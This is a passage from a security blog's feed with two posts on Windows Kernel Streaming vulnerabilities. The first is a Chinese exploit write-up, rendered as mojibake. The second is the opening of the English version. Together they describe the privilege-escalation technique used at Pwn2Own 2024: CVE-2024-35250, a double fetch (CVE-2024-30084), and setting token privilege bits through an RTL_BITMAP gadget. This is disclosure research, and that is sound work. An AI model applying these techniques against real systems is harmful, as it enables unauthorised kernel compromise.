&lt;p&gt;å®ƒæ˜¯å€‹éå¸¸å¥½ç”¨çš„ gadget è€Œä¸”æ˜¯ kCFG ä¸­åˆæ³•çš„ functionï¼Œå¦å¤–ä¹Ÿåªè¦æ§åˆ¶ä¸€å€‹åƒæ•¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_RTL_BITMAP&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BITMAP&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SizeOfBitMap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                   
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘å¯å°‡ Buffer æŒ‡å®šåˆ°ä»»æ„ä½ç½®ä¸¦æŒ‡å®šå¤§å°ï¼Œå°±å¯ä»¥å°‡ä¸€æ®µç¯„åœçš„ bits å…¨éƒ¨è¨­ç½®èµ·ä¾†ï¼Œåˆ°é€™é‚Šå°±å·®ä¸å¤šçµæŸäº†ï¼Œåªè¦    å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Token-&amp;gt;Privilege&lt;/code&gt; å…¨éƒ¨è¨­ç½®èµ·ä¾†ï¼Œå°±å¯ä»¥åˆ©ç”¨ Abuse Privilege æ–¹æ³•ä¾†åšåˆ° EoP äº†ã€‚&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/j1wzwXLxdVs?si=aKURBnYWXvbAaXin&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;ç„¶è€Œâ€¦åœ¨ Pwn2Own æ¯”è³½å‰ï¼Œæˆ‘å€‘åœ¨ Hyper-V ä¸Šå®‰è£ä¸€å€‹å…¨æ–° Windows 11 23H2 VM æ¸¬è©¦ Exploitï¼Œçµæœå¤±æ•—äº†ã€‚ è€Œä¸”æ˜¯åœ¨é–‹å•Ÿè¨­å‚™éšæ®µå°±å¤±æ•—ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç¶“éèª¿æŸ¥å¾Œç™¼ç¾åˆ° Hyper-V åœ¨é è¨­æƒ…æ³ä¸‹ä¸¦ä¸æœƒæœ‰éŸ³è¨Šè¨­å‚™ï¼Œé€ æˆ exploit æœƒå¤±æ•—ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ Hyper-V ä¸­ï¼Œé è¨­æƒ…æ³ä¸‹åªæœƒæœ‰ MSKSSRVï¼Œç„¶è€Œ MSKSSRV ä¹Ÿæ²’æœ‰ KSPROPSETID_DrmAudioStream é€™å€‹ Propertyï¼Œä½¿å¾—æˆ‘å€‘ç„¡æ³•æˆåŠŸåˆ©ç”¨é€™å€‹æ¼æ´é”æˆ EoPï¼Œå› æ­¤æˆ‘å€‘å¿…é ˆæ‰¾å…¶ä»–æ–¹å¼è§¸ç™¼æˆ–è€…æ‰¾æ–°çš„æ¼æ´ï¼Œæ­¤æ™‚æˆ‘å€‘æ±ºå®šé‡æ–° Review ä¸€éæ•´å€‹æµç¨‹ï¼Œçœ‹çœ‹æ˜¯å¦é‚„æœ‰å…¶ä»–å¯èƒ½åˆ©ç”¨çš„åœ°æ–¹ã€‚&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-30084&quot;&gt;CVE-2024-30084&lt;/h3&gt;
&lt;p&gt;é‡æ–°å¯©è¦–å¾Œï¼Œç™¼ç¾åˆ° IOCTL_KS_PROPERTY æ˜¯ä½¿ç”¨ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o&quot;&gt;Neither I/O&lt;/a&gt; ä¾†å‚³éè³‡æ–™çš„ï¼Œä¹Ÿå°±æ˜¯èªªæœƒç›´æ¥æ‹¿ä½¿ç”¨è€…çš„ Input buffer ä¾†åšè³‡æ–™ä¸Šçš„è™•ç†ï¼Œä¸€èˆ¬ä¾†èªªä¸å¤ªå»ºè­°ä½¿ç”¨é€™å€‹æ–¹æ³•ï¼Œå¾ˆå¸¸å‡ºç¾ Double Fetch çš„å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯å¾ä¸Šåœ–ä¸­ KspPropertyHandler çœ‹åˆ°ï¼Œåœ¨ä½¿ç”¨è€…å‘¼å« IOCTL ä¹‹å¾Œï¼Œæœƒç›´æ¥å°‡ Type3InputBuffer è¤‡è£½åˆ°æ–°åˆ†é…å‡ºä¾†çš„ Buffer ä¸­ï¼Œå…¶ä¸­æœƒå­˜æœ‰ &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;KSPROPERTY&lt;/a&gt; çµæ§‹ï¼Œæ¥ä¸‹ä¾†æœƒç”¨é€™çµæ§‹ä¸­çš„ GUID ä¾†æŸ¥è©¢ Property æ˜¯å¦æœ‰åœ¨è©²è¨­å‚™æ‰€æ”¯æ´çš„ Property ä¸­ï¼Œè‹¥å­˜åœ¨æ‰æœƒç¹¼çºŒå¾€ä¸‹å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;ã€‚&lt;/p&gt;

&lt;p&gt;é€™é‚Šæˆ‘å€‘å†å›é ­çœ‹ä¸€çœ¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥ç™¼ç¾åˆ°ï¼Œ&lt;strong&gt;å®ƒåˆå†æ¬¡å¾ Type3InputBuffer è¤‡è£½ä½¿ç”¨è€…æ‰€æä¾›çš„è³‡æ–™&lt;/strong&gt;åšç‚ºæ–°çš„ IOCTL çš„è¼¸å…¥ï¼Œå¾ˆæ˜é¡¯çš„é€™é‚Šå°±å­˜åœ¨äº†ä¸€å€‹ Double Fetch çš„æ¼æ´ï¼Œå› æ­¤æˆ‘å€‘å°‡æ•´å€‹åˆ©ç”¨æµç¨‹æ”¹æˆä¸‹åœ–çš„æ¨£å­&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ä¸€é–‹å§‹ç™¼é€ IOCTL_KS_PROPERTY æ™‚ï¼Œå°±æœƒå…ˆä»¥ MSKSSRV æ—¢æœ‰çš„ Property &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; ä¾†åšå¾ŒçºŒæ“ä½œï¼Œè€Œåœ¨åœ–ä¸­ç¬¬ 6 æ­¥æ™‚ï¼Œæœƒå…ˆè¤‡è£½ä¸€ä»½ Property çš„ GUID åˆ° Kernel ä¸­ï¼Œè€Œå¾Œå†ç”¨é€™å€‹ Property GUID å»æŸ¥è©¢æ˜¯å¦æœ‰åœ¨è©² KS Object çš„æ”¯æ´æ¸…å–®ä¸­ï¼Œè€Œé€™é‚Šå› ç‚º MSKSSRV æœ‰æ”¯æ´ï¼Œå°±æœƒå¾€ä¸‹å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨å‘¼å« UnserializePropertySet å¾Œï¼Œå› ç‚ºæœ‰ Double Fetch çš„æ¼æ´ï¼Œè®“æˆ‘å€‘å¯ä»¥åœ¨æª¢æŸ¥å¾Œåˆ°ä½¿ç”¨ä¹‹é–“ï¼Œå°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; æ›æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; ï¼Œè€Œæ¥ä¸‹ä¾†å°±å¯ä»¥è®“ ks ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; ä½œç‚º requests ä¾†ç™¼é€ IOCTLï¼Œå¾è€Œè§¸ç™¼å‰è¿°äº† CVE-2024-35250 é‚è¼¯æ¼æ´ï¼Œä½¿é€™å€‹æ¼æ´ä¸è«–åœ¨ç”šéº¼ç’°å¢ƒä¸‹éƒ½å¯ä»¥ä½¿ç”¨ã€‚&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/xNUj_XZ9LhQ?si=ONmvl9_8BV-z0idL&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;æœ€çµ‚æˆ‘å€‘æˆåŠŸåœ¨ Pwn2Own Vancouver 2024 ä¸­ï¼ŒæˆåŠŸæ”»ä¸‹ Micorsoft Windows 11ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ Pwn2Own çµæŸå¾Œï¼Œç¶“éæˆ‘å€‘èª¿æŸ¥ï¼Œç™¼ç¾åˆ°é€™å€‹æ¼æ´å¾ Windows 7 å°±å­˜åœ¨äº†ï¼Œè‡³å°‘å­˜åœ¨å°‡è¿‘ 20 å¹´ï¼Œè€Œä¸”åˆ©ç”¨ä¸Šéå¸¸ç©©å®šï¼Œæœ‰è‘—ç™¾åˆ†ä¹‹ç™¾çš„æˆåŠŸç‡ï¼Œå¼·çƒˆå»ºè­°å¤§å®¶ç›¡é€Ÿæ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬ ã€‚&lt;/p&gt;

&lt;h2 id=&quot;to-be-continued&quot;&gt;To be continued&lt;/h2&gt;
&lt;p&gt;é€™ç¯‡ä¸»è¦è‘—é‡åœ¨æˆ‘å€‘å¦‚ä½•æ‰¾åˆ°ä»Šå¹´åœ¨ Pwn2Own ä¸­æ‰€ä½¿ç”¨çš„æ¼æ´åŠ Kernel Streaming çš„æ”»æ“Šé¢åˆ†æã€‚åœ¨æ‰¾åˆ°é€™å€‹æ´ä¹‹å¾Œï¼Œæˆ‘å€‘å¾ŒçºŒä¹ŸæŒçºŒæœé€™å€‹æ–¹å‘ç¹¼çºŒç ”ç©¶ï¼Œä¹Ÿç™¼ç¾äº†å¦å¤–ä¸€å€‹ä¹Ÿæ˜¯ Exploitable çš„æ¼æ´ä»¥åŠå…¶ä»–æ›´å¤šæœ‰è¶£çš„æ¼æ´ï¼Œæˆ‘å€‘é è¨ˆåœ¨ä»Šå¹´åæœˆç™¼è¡¨ï¼Œæ•¬è«‹æœŸå¾… Part IIã€‚&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;Critically Close to Zero-Day: Exploiting Microsoft Kernel Streaming Service&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Windows Kernel Security - A Deep Dive into Two Exploits Demonstrated at Pwn2Own&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;CVE-2023-29360 Analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could/&quot;&gt;Racing Round and Round: The Little Bug That Could&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local Privilege Escalation via the Windows I/O Manager: A Variant Finding &amp;amp; Collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/</link>
                <guid>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1</guid>
                <pubDate>Fri, 23 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Over the past few decades, vulnerabilities in the Windows Kernel have emerged frequently. The popular attack surface has gradually shifted from Win32k to CLFS (Common Log File System). Microsoft has continuously patched these vulnerabilities, making these targets increasingly secure. However, which component might become the next attack target? Last year, MSKSSRV (Microsoft Kernel Streaming Service) became a popular target for hackers. However, this driver is tiny and can be analyzed in just a few days. Does this mean there might not be new vulnerabilities?&lt;/p&gt;

&lt;p&gt;This research will discuss an overlooked attack surface that allowed us to find more than ten vulnerabilities within two months. Additionally, we will delve into a proxy-based logical vulnerability type that allows us to bypass most validations, enabling us to successfully exploit Windows 11 in Pwn2Own Vancouver 2024.&lt;/p&gt;

&lt;p&gt;(This research will be divided into several parts, each discussing different bug classes and vulnerabilities. This research was also presented at &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/d6903413-cfba-4b80-a758-af9a257063d0/&quot;&gt;HITCON CMT 2024&lt;/a&gt;.)&lt;/p&gt;

&lt;h2 id=&quot;start-from-mskssrv&quot;&gt;Start from MSKSSRV&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;For vulnerability research, looking at historical vulnerabilities is indispensable.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Initially, we aimed to challenge Windows 11 in Pwn2Own Vancouver 2024. Therefore, we began by reviewing past Pwn2Own events and recent in-the-wild Windows vulnerabilities, searching for potential attack surfaces. Historical trends show that Win32K, primarily responsible for handling GDI-related operations, has always been a popular target, with numerous vulnerabilities still emerging. Since 2018, CLFS (Common Log File System) has also gradually become a popular target. Both components are extremely complex, suggesting that there are likely still many vulnerabilities.  However, becoming familiar with these components requires significant time, and many researchers are already examining them. Therefore, we did not choose to analyze them first.&lt;/p&gt;

&lt;p&gt;Last year, after &lt;a href=&quot;https://www.synacktiv.com/en&quot;&gt;Synacktiv&lt;/a&gt; successfully exploited a &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360&quot;&gt;vulnerability&lt;/a&gt; in MSKSSRV to compromise Windows 11 during Pwn2Own 2023, many researchers began to focus on this component. Shortly thereafter, a second vulnerability ,&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36802&quot;&gt;CVE-2023-36802&lt;/a&gt;, was discovered. At this time, &lt;a href=&quot;https://x.com/chompie1337&quot;&gt;chompie&lt;/a&gt; also published an &lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;excellent blog post&lt;/a&gt; detailing this vulnerability and its exploitation techniques. Given that this component is very small, with a file size of approximately 72 KB, it might only take a few days of careful examination to fully understand it. Therefore, we chose MSKSSRV for historical vulnerability analysis, with the hopeful prospect of identifying other vulnerabilities.&lt;/p&gt;

&lt;p&gt;We will briefly discuss these two vulnerabilities but not go into much detail.&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-29360---logical-vulnerability&quot;&gt;CVE-2023-29360 - logical vulnerability&lt;/h3&gt;
&lt;p&gt;The first one is the vulnerability used by Synacktiv in Pwn2Own Vancouver 2023.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is a logical vulnerability in the MSKSSRV driver. When MSKSSRV uses &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmprobeandlockpages&quot;&gt;MmProbeAndLockPages&lt;/a&gt; to lock user-specified memory address as framebuffer, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AccessMode&lt;/code&gt; was not set correctly. This leads to a failure to check whether the user-specified address belongs to the user space. If the user provides a kernel address, it will map the specified kernel address to user space for the user to use. Ultimately, this allows the user to write data to any address in the kernel. The exploitation is simple and very stable, making it become &lt;a href=&quot;https://www.cisa.gov/news-events/alerts/2024/02/29/cisa-adds-one-known-exploited-vulnerability-catalog&quot;&gt;one of the most popular vulnerabilities&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For more details, please refer to &lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Synacktivâ€™s presentation at HITB 2023 HKT&lt;/a&gt; and &lt;a href=&quot;https://x.com/Big5_sec&quot;&gt;Nicolas Zilio(@Big5_sec)&lt;/a&gt; â€˜s blog &lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;post&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-36802---type-confusion&quot;&gt;CVE-2023-36802 - type confusion&lt;/h3&gt;
&lt;p&gt;This vulnerability was discovered shortly after CVE-2023-29360 was released. It was already being exploited when Microsoft released their patches. This is a very easily discovered vulnerability. It uses the objects (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSContextReg&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSStreamReg&lt;/code&gt;) stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE_OBJECT-&amp;gt;FsContext2&lt;/code&gt; for subsequent processing. However, there is no check on the type of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FsContext2&lt;/code&gt;, leading to type confusion. For detailed information, you can refer to the &lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;IBM X-Force blog&lt;/a&gt;, which provides a very thorough explanation.&lt;/p&gt;

&lt;p&gt;Since then, there have been very few vulnerabilities related to MSKSSRV. Due to its relatively small size, MSKSSRV is quickly reviewed, and gradually, fewer and fewer people pay attention to it.&lt;/p&gt;

&lt;h3 id=&quot;but-is-that-the-end-of-it-&quot;&gt;But is that the end of it ?&lt;/h3&gt;
&lt;p&gt;However, does this mean there are no more vulnerabilities?&lt;/p&gt;

&lt;p&gt;In fact, the entire Kernel Streaming looks like the diagram below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;MSKSSRV is just the tip of the iceberg. In fact, there are many other potential components, and those listed in the diagram above are all part of Kernel Streaming. After delving into this attack surface, numerous vulnerabilities were eventually discovered, flowing like a stream.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By the way, while I was writing this blog, chompie also &lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could&quot;&gt;published&lt;/a&gt; about the vulnerability she used in this yearâ€™s Pwn2Own Vancouver 2024, &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30089&quot;&gt;CVE-2024-30089&lt;/a&gt;, which is also a vulnerability in MSKSSRV. The vulnerability lies in handling the reference count, requiring a lot of attention and thought to discover. It is also quite interesting, but I wonâ€™t discuss it here. I highly recommend reading &lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could&quot;&gt;this one&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;brief-overview-of-kernel-streaming&quot;&gt;Brief overview of Kernel Streaming&lt;/h2&gt;
&lt;p&gt;So, what is Kernel Streaming? In fact, we use it very frequently.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On Windows systems, when we open the webcam, enable sound, and activate audio devices such as microphones, the system needs to write or read related data such as your voice and captured images from your devices into RAM. It is essential to read data into your computer more efficiently during this process. Microsoft provides a framework called &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/kernel-streaming&quot;&gt;Kernel Streaming&lt;/a&gt; to handle these data, which &lt;strong&gt;primarily operates in kernel mode&lt;/strong&gt;. It features low latency, excellent scalability, and a unified interface, making handling streaming data more convenient and efficient.&lt;/p&gt;

&lt;p&gt;In Microsoftâ€™s Kernel Streaming, three multimedia class driver models are provided: port class, AVStream, and stream class. We will briefly introduce port class and AVStream, as stream class is less common and more outdated and will not be discussed here.&lt;/p&gt;

&lt;h3 id=&quot;port-class&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/introduction-to-port-class&quot;&gt;Port class&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;This type of driver is mostly used for PCI and DMA-based audio device hardware drivers. Currently, most audio-related processing, such as volume control or microphone-related processing, falls into this category. The main component library used would be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portcls.sys&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;avstream&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/avstream-overview&quot;&gt;AVStream&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;AVStream is a multimedia driver provided by Microsoft that primarily supports video-only and integrated audio/video streaming. Currently, most video-related processing, such as your webcam, capture card, etc., is associated with this category.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, the use of Kernel Streaming is also very complex. We will only provide a brief description. For more detailed information, please refer to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/&quot;&gt;Microsoft Learn&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;interact-with-device&quot;&gt;Interact with device&lt;/h2&gt;

&lt;p&gt;When we want to interact with audio devices or webcams, we need to open the device just like with any other device. Essentially, it interacts with the device driver in the same way. So, what would the names of these types of devices be? These names are not typically like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Device\NamedPipe&lt;/code&gt;, but rather something like the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\?\hdaudio#subfunc_01&amp;amp;ven_8086&amp;amp;dev_2812&amp;amp;nid_0001&amp;amp;subsys_00000000&amp;amp;rev_1000#6&amp;amp;2f1f346a&amp;amp;0&amp;amp;0002&amp;amp;0000001d#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\ehdmiouttopo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumerate-device&quot;&gt;Enumerate device&lt;/h3&gt;
&lt;p&gt;Here you can use APIs such as &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows/win32/api/setupapi/nf-setupapi-setupdigetclassdevsw&quot;&gt;SetupDiGetClassDevs&lt;/a&gt; to enumerate devices. Generally, KS series devices are registered under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSCATEGORY*&lt;/code&gt;, such as audio devices which are registered under &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/install/kscategory-audio&quot;&gt;KSCATEGORY_AUDIO&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Additionally, you can use the APIs provided by KS, such as &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ksproxy/nf-ksproxy-ksopendefaultdevice&quot;&gt;KsOpenDefaultDevice&lt;/a&gt;, to obtain the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handle&lt;/code&gt; of the first matching PnP device in that category. Actually, it is just a wrapper around &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetupDiGetClassDevs&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateFile&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsOpenDefaultDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSCATEGORY_VIDEO_CAMERA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;kernel-streaming-object&quot;&gt;Kernel Streaming object&lt;/h3&gt;

&lt;p&gt;After we open these devices, Kernel Streaming will create some Kernel Streaming related instances, the most important of which are &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-filters&quot;&gt;KS Filters&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-pins&quot;&gt;KS Pins&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;These will be used during the Kernel Streaming process. We will only provide a brief introduction here. We will use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters&quot;&gt;audio filters&lt;/a&gt; as an example, as most others are quite similar.&lt;/p&gt;

&lt;h4 id=&quot;ks-filters&quot;&gt;KS filters&lt;/h4&gt;
&lt;p&gt;Each KS Filter typically represents a device or a specific function of a device. When we open an audio device, it usually corresponds to a KS filter object. When we read data from the audio device, this data is first processed through this KS Filter.&lt;/p&gt;

&lt;p&gt;Conceptually, as shown in the diagram below, the large box in the middle represents a KS filter for the audio device. When we want to read data from the audio device, it is read into the filter from the left, processed through several nodes, and then output from the right.&lt;/p&gt;

